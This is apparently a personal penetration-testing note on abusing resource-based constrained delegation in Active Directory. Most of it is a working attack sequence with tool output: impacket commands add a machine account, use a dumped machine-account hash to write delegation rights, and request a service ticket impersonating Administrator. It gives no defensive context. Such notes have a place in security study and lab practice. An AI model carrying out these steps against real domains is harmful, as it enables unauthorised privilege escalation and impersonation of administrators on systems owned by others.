---
title: RBCD
author: i4
date: M05-21-2023
---

Resource based constrained delegation allows object to define which other machines it trusts to impersonate users to itself.

This is done by using the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
Since Microsoft allows `Authenticated Users` to join new devices.(Check `MachineAccountQuota` )

## Exploitation
We need one of the following:
- `NT Builtin\System` on a system
- dumped hash of an already existing machine account or the ability to create a new one
- User that has the permission to alter attributes on a machine object

First we gonna create a new machine in AD
```bash
$ impacket-addcomputer -computer-name victim -computer-pass hunter2 -dc-host falke.heimat.erde -dc-ip 10.0.0.100 HEIMAT.ERDE/i4@falke.heimat.erde 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Successfully added machine account victim$ with password hunter2.
```

Now we enable resource based constrained delegation:
- Notice how we're using the machine account (`elstr$`) to do this.
```
$ impacket-rbcd -delegate-to elstr$ -delegate-from victim$ -action write -hashes aad3b435b51404eeaad3b435b51404ee:6c429b2583cee8c5879d91f295439302 heimat.erde/elstr$
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] victim$ can now impersonate users on elstr$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     VICTIM$      (S-1-5-21-723141792-3823283005-3320163372-1109)
```

Now we can impersonate everything to `cifs`

```
$ impacket-getST -spn cifs/elstr -impersonate Administrator heimat.erde/victim$:hunter2                                                                
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```
